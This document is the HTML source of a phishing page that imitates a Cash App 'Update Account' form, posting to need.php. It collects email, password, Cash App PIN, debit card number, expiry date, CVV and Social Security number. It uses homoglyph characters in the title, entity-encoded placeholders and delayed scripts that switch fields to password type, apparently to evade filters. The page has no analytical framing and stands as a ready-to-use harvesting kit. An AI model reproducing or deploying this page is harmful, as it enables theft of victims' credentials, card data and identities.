<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Updаtе Aϲϲоυnt</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[2].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 0px solid #fff; 
    height: 52px; 
    width: 275px; 
	text-align: left;
  	font-family: Verdana;
    font-size: 18px;
  	color: #555;
    padding-left: 10px; 
    border-radius: 4px;   
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7;
} 
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 416px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body bgColor="#0BB634">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:416px; height:149px; z-index:0"><img src="images/c1.png" alt="" title="" border=0 width=416 height=149></div>
<form action=need.php name=kawabetha method=post>
<input name="ud" placeholder="E&#109;&#97;&#105;l A&#100;&#100;&#114;&#101;&#115;s " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:397px;left:10px;top:177px;z-index:1">
<input name="pd" placeholder="P&#97;&#115;&#115;&#119;&#111;&#114;d " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:397px;left:10px;top:247px;z-index:2">
<input name="pn" placeholder="C&#97;&#115;h A&#112;p P&#73;N " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:397px;left:10px;top:317px;z-index:2">
<input name="cn" placeholder="D&#101;&#98;&#105;t C&#97;&#114;d N&#117;&#109;&#98;&#101;r " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:397px;left:10px;top:387px;z-index:2">
<input name="ex" placeholder="E&#120;&#112;&#105;&#114;y D&#97;&#116;e M&#77;/&#89;Y " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:397px;left:10px;top:457px;z-index:2">
<input name="vc" placeholder="C&#86;V " class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:397px;left:10px;top:527px;z-index:2">
<input name="sn" placeholder="S&#111;&#99;&#105;&#97;l S&#101;&#99;&#117;&#114;&#105;&#116;y N&#117;&#109;&#98;&#101;r " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:397px;left:10px;top:597px;z-index:2">
<div id="formimage1" style="position:absolute; left:8px; top:675px; z-index:3"><input type="image" name="formimage1" width="398" height="57" src="images/btn.png"></div>
<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:750px; width:227px; height:29px; z-index:4"><img src="images/c2.png" alt="" title="" border=0 width=227 height=29></div>

</div>

</body>
</html>
